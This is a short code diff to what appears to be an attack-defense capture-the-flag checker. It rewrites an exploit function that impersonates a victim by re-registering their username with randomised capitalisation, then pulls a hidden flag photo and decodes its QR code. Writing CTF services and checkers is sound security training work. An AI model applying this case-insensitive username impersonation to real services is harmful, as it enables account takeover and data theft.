@@ -364,7 +364,7 @@ async def exploit_censor(
 
 
 @checker.exploit(1)
-async def exploit_cache_race(
+async def exploit_cache(
     task: ExploitCheckerTaskMessage,
     searcher: FlagSearcher,
     conn: Connection,
@@ -375,17 +375,20 @@ async def exploit_cache_race(
 
     u: User = user.random_user()
     cookies = await user.register(conn, u)
+
     nu = replace(u, name=utils.random_capitalize(username))
 
-    for attempt in range(20):
-        await user.update(conn, nu, cookies)
+    await user.update(conn, nu, cookies)
+    profile = await user.get_profile(conn, nu.name, cookies)
 
-        thumbnails = await user.get_photos(conn, nu.name, cookies)
+    pid: Photo = photo.get_by_description_contains(
+        profile, "could be a flag but you cant see it"
+    ).public_id
+    p: Photo = await photo.get(conn, pid)
 
-        for t in thumbnails:
-            if "could be a flag but you cant see it" in t["description"]:
-                data = await photo.get_data_public(conn, t["asset_id"])
-                return qr.decode(data)
+    data = await photo.get_data_public(conn, p.asset_id, cookies)
+
+    return qr.decode(data)
 
 
 @checker.putflag(2)
